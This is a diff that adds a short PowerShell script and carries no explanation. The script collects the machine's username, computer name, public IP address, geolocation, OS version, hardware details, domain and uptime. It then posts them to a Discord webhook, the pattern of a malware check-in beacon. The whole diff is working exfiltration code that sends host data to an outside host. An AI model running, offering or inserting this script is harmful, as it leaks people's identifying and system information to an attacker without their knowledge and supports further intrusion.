@@ -1,0 +1,4 @@
+$webhookUrl = "https://discord.com/api/webhooks/" + $env:h; 
+$r = Invoke-RestMethod -Uri https://ipinfo.io/json;$s = Get-ComputerInfo; 
+$Body = @{"username" = "$env:username@$env:computername"; "content" = "Ping `n $env:username@$env:computername IP: $($r.ip)`n Timezone: $($r.timezone)`n City: $($r.city) Region: $($r.region) Country: $($r.country)`n $($s.OsName) $($s.OsVersion)`n $($s.CsProcessors.name)`n Ram: $($s.CsTotalPhysicalMemory) $($s.CsDomain)`n $($s.TimeZone)`n Localtime: $($s.OsLocalDateTime)`n LastBoot: $($s.OsLastBootUpTime) Uptime: $($s.OsUptime)"};
+Invoke-RestMethod -Uri $webhookUrl -Method "post" -Body $Body
